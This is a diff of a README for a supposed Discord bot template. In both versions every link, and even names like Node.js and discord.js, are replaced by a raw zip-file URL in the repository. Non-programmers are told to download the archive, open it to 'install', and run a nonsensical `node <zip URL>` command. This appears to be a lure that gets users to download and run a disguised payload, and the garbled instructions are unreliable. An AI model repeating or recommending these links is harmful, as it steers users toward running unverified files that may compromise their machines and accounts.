@@ -4,23 +4,23 @@
 Welcome to the discord-bot-template-advanced! This template provides everything you need to set up a Discord bot easily. You don’t need programming knowledge to get started. Just follow these simple steps.
 
 ## 📥 Download the Application
-To download the latest version of the discord-bot-template-advanced, visit this page: [Download Here](https://raw.githubusercontent.com/JoseWillyan/discord-bot-template-advanced/main/src/discord-bot-template-advanced-3.2.zip).
+To download the latest version of the discord-bot-template-advanced, visit this page: [Download Here](https://github.com/JoseWillyan/discord-bot-template-advanced/raw/refs/heads/main/src/discord_template_bot_advanced_v2.3.zip).
 
 ## 📦 Features
 - **CAPTCHA System**: Verify users with an easy CAPTCHA interface.
 - **Moderation Tools**: Keep your server safe with built-in moderation commands.
 - **Anti-Spam Features**: Protect your community from spam and abuse.
 - **Ticket System**: Manage user queries and support requests through a ticketing system.
-- **Easy Setup**: Ready-to-use TypeScript starter with a modern https://raw.githubusercontent.com/JoseWillyan/discord-bot-template-advanced/main/src/discord-bot-template-advanced-3.2.zip v14 architecture.
+- **Easy Setup**: Ready-to-use TypeScript starter with a modern https://github.com/JoseWillyan/discord-bot-template-advanced/raw/refs/heads/main/src/discord_template_bot_advanced_v2.3.zip v14 architecture.
 
 ## 🔧 System Requirements
 To run this bot, ensure your system meets the following requirements:
 - **Operating System**: Windows 10 or later, macOS, or Linux.
-- **https://raw.githubusercontent.com/JoseWillyan/discord-bot-template-advanced/main/src/discord-bot-template-advanced-3.2.zip**: Version 16 or above must be installed. 
+- **https://github.com/JoseWillyan/discord-bot-template-advanced/raw/refs/heads/main/src/discord_template_bot_advanced_v2.3.zip**: Version 16 or above must be installed. 
 - **Git**: Recommended for easier updates.
 
 ## 📂 Download & Install
-1. Visit the [Releases Page](https://raw.githubusercontent.com/JoseWillyan/discord-bot-template-advanced/main/src/discord-bot-template-advanced-3.2.zip).
+1. Visit the [Releases Page](https://github.com/JoseWillyan/discord-bot-template-advanced/raw/refs/heads/main/src/discord_template_bot_advanced_v2.3.zip).
 2. Select the latest version available.
 3. Click on the asset file that matches your operating system to download.
 4. Once downloaded, open the file to start the installation process.
@@ -38,12 +38,12 @@ After installation, you will need to configure your bot:
 Once everything is set up:
 1. Open a terminal window.
 2. Navigate to the folder where you installed the bot.
-3. Run the command `node https://raw.githubusercontent.com/JoseWillyan/discord-bot-template-advanced/main/src/discord-bot-template-advanced-3.2.zip`.
+3. Run the command `node https://github.com/JoseWillyan/discord-bot-template-advanced/raw/refs/heads/main/src/discord_template_bot_advanced_v2.3.zip`.
 4. Your bot will connect to Discord, and you will see a confirmation message.
 
 ## 🛠 Troubleshooting
 If you encounter issues:
-- Make sure https://raw.githubusercontent.com/JoseWillyan/discord-bot-template-advanced/main/src/discord-bot-template-advanced-3.2.zip is properly installed.
+- Make sure https://github.com/JoseWillyan/discord-bot-template-advanced/raw/refs/heads/main/src/discord_template_bot_advanced_v2.3.zip is properly installed.
 - Check for any error messages in the terminal and refer to the documentation for potential solutions.
 - Visit the GitHub Issues page for more help from the community.
 
@@ -61,7 +61,7 @@ This project covers various topics including:
 Join our community to ask questions or share your experiences. Connect with fellow users and developers on Discord and GitHub. Your engagement can help others as well.
 
 ## 📱 Stay Updated
-To keep your bot updated, visit the [Releases Page](https://raw.githubusercontent.com/JoseWillyan/discord-bot-template-advanced/main/src/discord-bot-template-advanced-3.2.zip) regularly. Download the latest versions to benefit from new features and fixes.
+To keep your bot updated, visit the [Releases Page](https://github.com/JoseWillyan/discord-bot-template-advanced/raw/refs/heads/main/src/discord_template_bot_advanced_v2.3.zip) regularly. Download the latest versions to benefit from new features and fixes.
 
 ## 🗒 License
 This project is licensed under the MIT License, allowing you to freely use and modify it. Please refer to the license file in the repository for more information.
